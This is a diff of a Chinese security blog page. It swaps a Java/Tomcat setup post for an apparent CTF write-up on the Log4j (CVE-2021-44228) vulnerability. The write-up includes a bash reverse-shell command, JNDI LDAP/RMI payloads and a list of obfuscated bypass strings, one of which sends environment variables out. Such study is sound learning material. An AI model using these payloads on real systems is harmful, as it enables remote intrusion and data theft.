@@ -17,34 +17,28 @@
   <meta name="author" content="D3n13d">
   <meta name="keywords" content="Web,CTF,渗透测试">
   
-    <meta name="description" content="系统：Windows 10 JDK版本：11  Tomcat 负责提供Java web服务，是一个Servlet容器，只做动态代码解析。 Maven 项目构建管理工具，Maven的核心思想：约定大于配置。 Tomcat配置环境变量中添加 12CLASS_PATH	.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jarJAVA_HOME	D:\Enviro\jdk1">
+    <meta name="description" content="原理剖析几个概念： ​    RMI：Java RMI是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的JVM中的对象的外表和行为都像本地对象一样 ​    JNDI：JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一个Java-Web搭建经历">
-<meta property="og:url" content="https://d3n13d.github.io/2022/03/12/%E8%AE%B0%E4%B8%80%E4%B8%AAJava-web%E6%90%AD%E5%BB%BA%E7%BB%8F%E5%8E%86/index.html">
+<meta property="og:title" content="Log4j漏洞学习">
+<meta property="og:url" content="https://d3n13d.github.io/2022/04/12/Log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="D3n13d &#39;s blog">
-<meta property="og:description" content="系统：Windows 10 JDK版本：11  Tomcat 负责提供Java web服务，是一个Servlet容器，只做动态代码解析。 Maven 项目构建管理工具，Maven的核心思想：约定大于配置。 Tomcat配置环境变量中添加 12CLASS_PATH	.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jarJAVA_HOME	D:\Enviro\jdk1">
+<meta property="og:description" content="原理剖析几个概念： ​    RMI：Java RMI是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的JVM中的对象的外表和行为都像本地对象一样 ​    JNDI：JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122232020.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122238099.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122243012.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203140938217.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203140938042.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203140951737.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122247130.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122248695.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122250770.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122251278.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122252175.png">
-<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122253622.png">
-<meta property="article:published_time" content="2022-03-12T13:59:58.000Z">
-<meta property="article:modified_time" content="2022-04-11T11:28:38.419Z">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204121858835.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122323327.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122324319.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122316909.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122319102.png">
+<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122322202.png">
+<meta property="article:published_time" content="2022-04-12T10:58:06.000Z">
+<meta property="article:modified_time" content="2022-04-12T15:27:14.978Z">
 <meta property="article:author" content="D3n13d">
 <meta property="article:tag" content="Java">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122232020.png">
+<meta name="twitter:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204121858835.png">
   
   
-  <title>记一个Java-Web搭建经历 - D3n13d &#39;s blog</title>
+  <title>Log4j漏洞学习 - D3n13d &#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -211,7 +205,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="记一个Java-Web搭建经历">
+            <span class="h2" id="subtitle" title="Log4j漏洞学习">
               
             </span>
 
@@ -226,8 +220,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-03-12 21:59" pubdate>
-        2022年3月12日 晚上
+      <time datetime="2022-04-12 18:58" pubdate>
+        2022年4月12日 晚上
       </time>
     </span>
   
@@ -237,7 +231,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.3k 字
+      3k 字
     </span>
   
 
@@ -246,7 +240,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5 分钟
+      12 分钟
     </span>
   
 
@@ -275,85 +269,64 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">记一个Java-Web搭建经历</h1>
+            <h1 style="display: none">Log4j漏洞学习</h1>
             
             <div class="markdown-body">
-              <blockquote>
-<p>系统：Windows 10</p>
-<p>JDK版本：11</p>
-</blockquote>
-<p>Tomcat 负责提供Java web服务，是一个Servlet容器，只做动态代码解析。</p>
-<p>Maven 项目构建管理工具，Maven的核心思想：约定大于配置。</p>
-<h2 id="Tomcat配置"><a href="#Tomcat配置" class="headerlink" title="Tomcat配置"></a>Tomcat配置</h2><p>环境变量中添加</p>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs taggerscript">CLASS_PATH	.;<span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\l</span>ib;<span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\l</span>ib<span class="hljs-symbol">\t</span>ools.jar<br>JAVA_HOME	D:<span class="hljs-symbol">\E</span>nviro<span class="hljs-symbol">\j</span>dk11\<br></code></pre></td></tr></table></figure>
+              <h2 id="原理剖析"><a href="#原理剖析" class="headerlink" title="原理剖析"></a>原理剖析</h2><p>几个概念：</p>
+<p>​    <strong>RMI</strong>：Java RMI是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的JVM中的对象的外表和行为都像本地对象一样</p>
+<p>​    <strong>JNDI</strong>：JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）</p>
+<p>​    <strong>Naming Service</strong></p>
+<p>​    命名服务是将名称与值相关联的实体，称为”绑定”。它提供了一种使用”find”或”search”操作来根据名称查找对象的便捷方式。 就像DNS一样，通过命名服务器提供服务，大部分的J2EE服务器都含有命名服务器 。例如RMI Registry就是使用的Naming Service。</p>
+<p>​    <strong>Directory Service</strong></p>
+<p>​    是一种特殊的Naming Service，它允许存储和搜索”目录对象”，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。下面说到的LDAP就是目录服务。</p>
+<p>​    <strong>LDAP</strong>：LDAP是一个目录服务，可以通过目录路径查询到对应目录下的对象（文件）等。即其也是JNDI的实现，通过名称（目录路径）查询到对象（目录下的文件）</p>
+<p>​    <strong>Log4j</strong>：我的另一篇文章里有简单提到 简单来说就是 日志系统的功能模块 <a href="https://d3n13d.github.io/2022/03/09/Java-Security/#Log4j">demo导航</a></p>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204121858835.png" srcset="/img/loading.gif" lazyload alt="image-20220412185824711"></p>
+<center>Log4j攻击原理</center>
 
-<p>在 <code>apache-tomcat\conf\</code> 下的 <code>server.xml</code> 中可以修改你的站点名称，运行端口，不过多赘述</p>
-<p>运行Tomcat需要双击 <code>apache-tomcat\bin\</code> 下的 <code>startup.bat</code> </p>
-<p>我做的几点修改：</p>
-<ul>
-<li>修改文件内的环境变量</li>
-</ul>
-<p>作用文件：<code>apache-tomcat\bin\startup.bat</code> 和 <code>apache-tomcat\bin\setclasspath.bat</code></p>
-<p>添加 两个局部变量。因为 jdk版本大于 11 之后，存在内置的 JRE 所以这里 JAVA_HOME 和 JRE_HOME 保持一致即可</p>
-<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic">set JAVA_HOME=D:\Enviro\jdk11\<br>set JRE_HOME=D:\Enviro\jdk11\<br></code></pre></td></tr></table></figure>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>来源：ctfshow-Log4j复现</p>
+<p><strong>检测</strong></p>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122323327.png" srcset="/img/loading.gif" lazyload alt="image-20220412232345272"></p>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122324319.png" srcset="/img/loading.gif" lazyload alt="image-20220412232408274"></p>
+<p>dnslog这边有记录就中</p>
+<p><strong>漏洞利用</strong></p>
+<p>JNDIExploit-1.2-SNAPSHOT.jar</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ip -p 8080<br></code></pre></td></tr></table></figure>
 
-<ul>
-<li>添加Pause</li>
-</ul>
-<p>作用文件：<code>apache-tomcat\bin\startup.bat</code> 文件结尾添加暂停，防止闪退。</p>
-<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">pause<br></code></pre></td></tr></table></figure>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122316909.png" srcset="/img/loading.gif" lazyload alt="image-20220412231651851"></p>
+<p>这边先启动程序，然后来构建shell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/IP/</span>PORT <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>     <span class="hljs-comment">#我这里12345作为PORT 后面会用到</span><br><span class="hljs-comment"># =&gt; YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC8xMjM0NSAwPiYx   先base64</span><br><span class="hljs-comment"># =&gt; YmFzaCAtaSA%2BJiAvZGV2L3RjcC9JUC8xMjM0NSAwPiYx  然后urlencode</span><br></code></pre></td></tr></table></figure>
 
-<ul>
-<li>防止输出日志乱码</li>
-</ul>
-<p>修改 <code>apache-tomcat\conf\server.xml</code> 修改</p>
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122232020.png" srcset="/img/loading.gif" lazyload alt="image-20220312223249908"></p>
-<p>然后修改输出日志的编码格式</p>
-<p>修改 <code>\apache-tomcat\conf\logging.properties</code> </p>
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122238099.png" srcset="/img/loading.gif" lazyload alt="image-20220312223838049"></p>
-<center>完成上面操作应有的结果</center>
+<p>随后构建payload</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/ip:1389/</span>TomcatBypass/Command/Base64/(上面的构建shell最后的结果)&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122243012.png" srcset="/img/loading.gif" lazyload alt="image-20220312224301903"></p>
-<h2 id="IDEA配置项目"><a href="#IDEA配置项目" class="headerlink" title="IDEA配置项目"></a>IDEA配置项目</h2><p>新建项目</p>
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203140938217.png" srcset="/img/loading.gif" lazyload alt="image-20220314093803073"></p>
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203140938042.png" srcset="/img/loading.gif" lazyload alt="image-20220314093835989"></p>
-<p>​    <img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203140951737.png" srcset="/img/loading.gif" lazyload alt="image-20220314095135681"></p>
-<center>最终成果</center>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122319102.png" srcset="/img/loading.gif" lazyload alt="image-20220412231951047"></p>
+<p>这年头复现个洞都这么不容易….</p>
+<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122322202.png" srcset="/img/loading.gif" lazyload alt="image-20220412232208123"></p>
+<center><h3>我是笨比</h3></center>
 
-<h2 id="Maven配置"><a href="#Maven配置" class="headerlink" title="Maven配置"></a>Maven配置</h2><p>在环境变量中添加</p>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">M2 HOME D:<span class="hljs-symbol">\E</span>nviro<span class="hljs-symbol">\a</span>pache-maven-3.8.4<span class="hljs-symbol">\b</span>in<br>MAVEN HOME D:<span class="hljs-symbol">\E</span>nviro<span class="hljs-symbol">\a</span>pache-maven-3.8.4\<br>在系统的path中配置 <span class="hljs-variable">%MAVEN_HOME%</span><span class="hljs-symbol">\b</span>in <br></code></pre></td></tr></table></figure>
 
-<p>然后修改 <code>apache-maven\conf\settings.xml</code> 添加，需完整去除原先默认镜像(mirrors)配置</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirrors</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>nexus-aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*,!jeecg,!jeecg-snapshots<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Nexus aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirrors</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>然后添加本地仓库位置</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>D:\Enviro\apache-maven-3.8.4\mavenrepo<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="收集到的一些Bypass手段"><a href="#收集到的一些Bypass手段" class="headerlink" title="收集到的一些Bypass手段"></a>收集到的一些Bypass手段</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">&#123;jndi:ldap://ip:1389/ badClassName&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;jndi:rmi://ip&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;::-j&#125;</span>ndi:rmi://ip/Exploit&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;lower:jndi&#125;</span>:<span class="hljs-variable">$&#123;lower:rmi&#125;</span>://ip/Exploit&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;upper:jndi&#125;</span>:<span class="hljs-variable">$&#123;upper:rmi&#125;</span>://ip/Exploit&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;lower:<span class="hljs-variable">$&#123;lower:jndi&#125;</span>&#125;</span>:<span class="hljs-variable">$&#123;lower:rmi&#125;</span>://ip/Exploit&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;lower:j&#125;</span><span class="hljs-variable">$&#123;lower:n&#125;</span><span class="hljs-variable">$&#123;lower:d&#125;</span>i:<span class="hljs-variable">$&#123;lower:rmi&#125;</span>://ip/Exploit&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;lower:j&#125;</span><span class="hljs-variable">$&#123;upper:n&#125;</span><span class="hljs-variable">$&#123;lower:d&#125;</span><span class="hljs-variable">$&#123;upper:i&#125;</span>:<span class="hljs-variable">$&#123;lower:r&#125;</span>m<span class="hljs-variable">$&#123;lower:i&#125;</span>&#125;://ip/Exploit&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;upper:j&#125;</span><span class="hljs-variable">$&#123;upper:n&#125;</span><span class="hljs-variable">$&#123;lower:d&#125;</span>i:<span class="hljs-variable">$&#123;upper:rmi&#125;</span>://ip/Exploit&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;upper:j&#125;</span><span class="hljs-variable">$&#123;upper:n&#125;</span><span class="hljs-variable">$&#123;upper:d&#125;</span><span class="hljs-variable">$&#123;upper:i&#125;</span>:<span class="hljs-variable">$&#123;lower:r&#125;</span>m<span class="hljs-variable">$&#123;lower:i&#125;</span>&#125;://ip/Exploit&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;::-j&#125;</span><span class="hljs-variable">$&#123;::-n&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;::-i&#125;</span>:<span class="hljs-variable">$&#123;::-r&#125;</span><span class="hljs-variable">$&#123;::-m&#125;</span><span class="hljs-variable">$&#123;::-i&#125;</span>://ip:1389/Exploit&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;::-j&#125;</span><span class="hljs-variable">$&#123;::-n&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;::-i&#125;</span>:<span class="hljs-variable">$&#123;::-l&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;::-a&#125;</span><span class="hljs-variable">$&#123;::-p&#125;</span>://<span class="hljs-variable">$&#123;hostName&#125;</span>.ip&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;upper::-j&#125;</span><span class="hljs-variable">$&#123;upper::-n&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;upper::-i&#125;</span>:<span class="hljs-variable">$&#123;upper::-l&#125;</span><span class="hljs-variable">$&#123;upper::-d&#125;</span><span class="hljs-variable">$&#123;upper::-a&#125;</span><span class="hljs-variable">$&#123;upper::-p&#125;</span>://<span class="hljs-variable">$&#123;hostName&#125;</span>.ip&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;::-j&#125;</span><span class="hljs-variable">$&#123;::-n&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;::-i&#125;</span>:<span class="hljs-variable">$&#123;::-l&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;::-a&#125;</span><span class="hljs-variable">$&#123;::-p&#125;</span>://<span class="hljs-variable">$&#123;hostName&#125;</span>.<span class="hljs-variable">$&#123;env:COMPUTERNAME&#125;</span>.<span class="hljs-variable">$&#123;env:USERDOMAIN&#125;</span>.<span class="hljs-variable">$&#123;env&#125;</span>.ip</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122247130.png" srcset="/img/loading.gif" lazyload alt="image-20220312224759077"></p>
-<h2 id="IDEA配置项目-1"><a href="#IDEA配置项目-1" class="headerlink" title="IDEA配置项目"></a>IDEA配置项目</h2><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122248695.png" srcset="/img/loading.gif" lazyload alt="image-20220312224842633" style="zoom:80%;" />
 
-<center>选择模板创建项目</center>
 
-<img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122250770.png" srcset="/img/loading.gif" lazyload alt="image-20220312225035706" style="zoom:80%;" />
-
-<center>选择工程名称</center>
-
-<img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122251278.png" srcset="/img/loading.gif" lazyload alt="image-20220312225117218" style="zoom:80%;" />
-
-<center>设置Maven选项</center>
-
-<img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122252175.png" srcset="/img/loading.gif" lazyload alt="image-20220312225253093" style="zoom:80%;" />
-
-<center>这里添加一个配置</center>
-
-<img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122253622.png" srcset="/img/loading.gif" lazyload alt="image-20220312225305742" style="zoom:80%;" />
-
-<center>配置tomcat运行选项</center>
+<p><strong>参考链接</strong>：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hilaryfrank/article/details/121939902">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(二)—漏洞原理</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45677145/article/details/121980230?spm=1001.2101.3001.6650.9&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-9.pc_relevant_antiscanv2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-9.pc_relevant_antiscanv2&utm_relevant_index=14">Log4j2 远程代码执行漏洞（cve-2021-44228）复现（反弹shell）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52829570/article/details/122496645">ctfshow Log4j复现wp</a></p>
 
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
                 
                 
                   <div class="post-meta">
@@ -366,7 +339,7 @@
               </div>
               <p class="note note-warning">
                 <strong>本文作者: </strong><a href="/">D3n13d</a> <br>
-                <strong>本文链接: </strong><a href="https://d3n13d.github.io/2022/03/12/%E8%AE%B0%E4%B8%80%E4%B8%AAJava-web%E6%90%AD%E5%BB%BA%E7%BB%8F%E5%8E%86/">https://d3n13d.github.io/2022/03/12/%E8%AE%B0%E4%B8%80%E4%B8%AAJava-web%E6%90%AD%E5%BB%BA%E7%BB%8F%E5%8E%86/</a> <br>
+                <strong>本文链接: </strong><a href="https://d3n13d.github.io/2022/04/12/Log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">https://d3n13d.github.io/2022/04/12/Log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a> <br>
                 <strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                    </p>
                    
@@ -375,18 +348,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/03/15/%E4%BB%8EServlet%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%88%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getFlag/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">从Servlet安全问题到反序列化getFlag</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/03/09/Java-Security/">
-                        <span class="hidden-mobile">Java Security</span>
+                      <a href="/2022/04/03/%E7%89%B9%E5%88%AB%E7%9A%84%E6%96%87%E7%AB%A0/">
+                        <span class="hidden-mobile">特别的文章</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
